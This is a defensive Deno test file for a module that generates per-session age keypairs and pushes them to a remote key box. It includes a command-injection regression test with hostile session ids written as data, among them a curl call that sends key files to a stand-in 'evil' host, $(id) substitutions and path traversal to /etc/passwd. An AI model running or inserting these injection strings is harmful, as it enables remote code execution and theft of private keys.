/**
 * Per-session age keypairs and the identity push that a hostile session id
 * must never reach. These contracts lived in tests/session_keys_test.ts and
 * tests/gate_submit_keys_test.ts; CI cannot run that directory.
 *
 * Hermetic: transports are injected. No ssh, no key box.
 *
 *   deno test --allow-env --allow-read lib/session-keys_test.ts
 */

import { assert, assertEquals, assertRejects, assertThrows } from '$std/assert/mod.ts';
import { armor, Decrypter } from '@age/age-encryption';
import { ageEncryptTo } from './age-encrypt.ts';
import {
  assertSafeSessionId,
  breakglassRecipient,
  generateSessionKeypair,
  IdentityPushFailed,
  pushIdentity,
  shredRemoteIdentity,
} from './session-keys.ts';

Deno.test('generateSessionKeypair - keypair is usable and unique per call', async () => {
  const a = await generateSessionKeypair();
  const b = await generateSessionKeypair();

  assert(a.identity.startsWith('AGE-SECRET-KEY-'));
  assert(a.recipient.startsWith('age1'));
  assert(a.identity !== b.identity, 'each session must get its own key');

  const armored = await ageEncryptTo('answer', [a.recipient]);
  const d = new Decrypter();
  d.addIdentity(a.identity);
  assertEquals(await d.decrypt(armor.decode(armored), 'text'), 'answer');
});

const SESSION = '11111111-2222-3333-4444-555555555555';

Deno.test('pushIdentity - hands the identity to the transport', async () => {
  const seen: Array<{ id: string; key: string }> = [];
  await pushIdentity(SESSION, 'AGE-SECRET-KEY-TEST', (id, key) => {
    seen.push({ id, key });
    return Promise.resolve();
  });
  assertEquals(seen, [{ id: SESSION, key: 'AGE-SECRET-KEY-TEST' }]);
});

Deno.test('pushIdentity - transport failure message carries no key material', async () => {
  const err = await pushIdentity(SESSION, 'AGE-SECRET-KEY-LEAKME', () => Promise.reject(new Error('boom')))
    .then(() => null, (e: Error) => e);
  assert(err !== null);
  assert(!err.message.includes('LEAKME'), 'key material must never reach an error message');
});

Deno.test('pushIdentity - a transport failure is marked ambiguous', async () => {
  const err = await pushIdentity(SESSION, 'AGE-SECRET-KEY-1TEST', () => Promise.reject(new Error('killed at deadline')))
    .then(() => null, (e: unknown) => e);

  assert(err instanceof IdentityPushFailed, 'must be an IdentityPushFailed');
  assertEquals(err.ambiguous, true, 'the key box may be holding a key; caller must clean up');
});

/**
 * Command-injection regression.
 *
 * The default transport interpolates the session id into a command that a
 * REMOTE SHELL runs, so a hostile id is remote code execution on the box that
 * holds every respondent's private key. These ids must be refused before any
 * transport is invoked -- note the assertions check the transport never ran,
 * not merely that the call rejected.
 */
Deno.test('pushIdentity - refuses shell metacharacters in the session id', async () => {
  const hostile = [
    'x; curl http://evil/$(cat /var/lib/keybox/keys/*.key); #',
    'a$(id)b',
    'a`id`b',
    'a|id',
    "a'b",
    '../../etc/cron.d/x',
    'a\nid',
  ];

  for (const id of hostile) {
    let transportRan = false;
    await assertRejects(
      () =>
        pushIdentity(id, 'AGE-SECRET-KEY-TEST', () => {
          transportRan = true;
          return Promise.resolve();
        }),
      Error,
      'invalid session id',
    );
    assert(!transportRan, `transport must never run for a hostile id: ${JSON.stringify(id)}`);
  }
});

Deno.test('pushIdentity - a rejected session id is not ambiguous', async () => {
  let transportRan = false;
  const err = await pushIdentity('../escape', 'AGE-SECRET-KEY-1TEST', () => {
    transportRan = true;
    return Promise.resolve();
  }).then(() => null, (e: unknown) => e);

  assert(err instanceof Error);
  assert(!(err instanceof IdentityPushFailed), 'nothing was sent, so nothing is ambiguous');
  assert(!transportRan, 'the transport must never run for a bad session id');
});

Deno.test('pushIdentity - accepts a real gate token', async () => {
  let ran = false;
  await pushIdentity(SESSION, 'AGE-SECRET-KEY-TEST', () => {
    ran = true;
    return Promise.resolve();
  });
  assert(ran, 'a legitimate UUID gate token must still be accepted');
});

Deno.test('shredRemoteIdentity - asks the transport to remove that session', async () => {
  const asked: string[] = [];
  await shredRemoteIdentity(SESSION, (id) => {
    asked.push(id);
    return Promise.resolve();
  });
  assertEquals(asked, [SESSION]);
});

Deno.test('shredRemoteIdentity - refuses a hostile session id', async () => {
  let ran = false;
  await assertRejects(
    () =>
      shredRemoteIdentity('../../etc/passwd', () => {
        ran = true;
        return Promise.resolve();
      }),
    Error,
    'invalid session id',
  );
  assert(!ran, 'the transport must never see a hostile id');
});

// Cleanup is best-effort by design: the caller is already failing a submission
// and must not fail differently because the withdrawal also failed.
Deno.test('shredRemoteIdentity - swallows transport failure rather than masking the original error', async () => {
  await shredRemoteIdentity(SESSION, () => Promise.reject(new Error('mesh down')));
});

Deno.test('assertSafeSessionId - the same allowlist the key box uses', () => {
  assertSafeSessionId(SESSION);
  assertThrows(() => assertSafeSessionId('short'), Error, 'invalid session id');
  assertThrows(() => assertSafeSessionId('not-hex-zzzz-zzzz-zzzz-zzzzzzzzzzzz'), Error, 'invalid session id');
});

Deno.test('breakglassRecipient - unset configuration is fatal, not a silent empty key', () => {
  const prev = Deno.env.get('BREAKGLASS_AGE_RECIPIENT');
  Deno.env.delete('BREAKGLASS_AGE_RECIPIENT');
  try {
    assertThrows(() => breakglassRecipient(), Error, 'BREAKGLASS_AGE_RECIPIENT not configured');
  } finally {
    if (prev === undefined) Deno.env.delete('BREAKGLASS_AGE_RECIPIENT');
    else Deno.env.set('BREAKGLASS_AGE_RECIPIENT', prev);
  }
});
